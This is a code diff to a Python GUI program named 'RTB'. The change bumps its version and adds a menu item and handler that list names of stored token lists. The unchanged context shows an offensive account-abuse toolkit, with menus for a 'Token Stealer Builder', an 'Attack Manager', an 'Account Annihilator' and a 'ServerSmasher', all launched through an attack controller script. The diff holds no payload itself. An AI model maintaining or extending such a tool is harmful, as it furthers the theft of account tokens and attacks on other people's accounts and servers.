@@ -346,7 +346,7 @@
 # Public License instead of this License.
 
 
-rtbversion = "1.1.1"
+rtbversion = "1.2.1"
 
 # Load Config
 try:
@@ -1196,7 +1196,7 @@ def main():
     elif command_line_mode == 0:
         menu_def = [
             ['RTB', ['Attack Manager', 'Options', ['Updater', 'Settings', 'Themes', ['Change Theme', 'Theme Repo']], 'Tools', ['Proxy Checker/Scraper', 'CPU Widget', 'CF Check'], 'About', ['Info', 'Diagnostics']]],
-            ['Tokens', ['View/Add Tokens', 'Change Token List', 'Token Stealer Builder', 'Token Toolkit']],
+            ['Tokens', ['View/Add Tokens', 'Change Token List', 'View Token List Names', 'Token Stealer Builder', 'Token Toolkit']],
             ['Help', ['Wiki', 'My YouTube', 'Nope', 'Telegram']],
             ['ServerSmasher', ['Launch GUI', 'Launch Legacy']],
             ['Plugins', ['View Plugins', 'Plugin Repo']]
@@ -1932,6 +1932,9 @@ def main():
                         else:
                             p = subprocess.Popen([sys.executable,'RTBFiles/attack_controller.py',"Annihilator",sys.executable,str(command_line_mode),str(thread_count),str(attacks_theme),values['Token']],stdout=open("errors.log", "a+"), stderr=subprocess.STDOUT)
                             currentattacks["Account Annihilator | Started at: {}".format(datetime.datetime.now().time())] = p.pid
+            elif event == "View Token List Names":
+                p = subprocess.Popen([sys.executable,'RTBFiles/attack_controller.py',"TokenNames",sys.executable,str(command_line_mode),str(thread_count),str(attacks_theme)],stdout=open("errors.log", "a+"), stderr=subprocess.STDOUT)
+                currentattacks["Token Info | Started at: {}".format(datetime.datetime.now().time())] = p.pid
             #  _  _     _        _    _      _
             # | || |___| |_ __  | |  (_)_ _ | |__ ___
             # | __ / -_) | '_ \ | |__| | ' \| / /(_-<
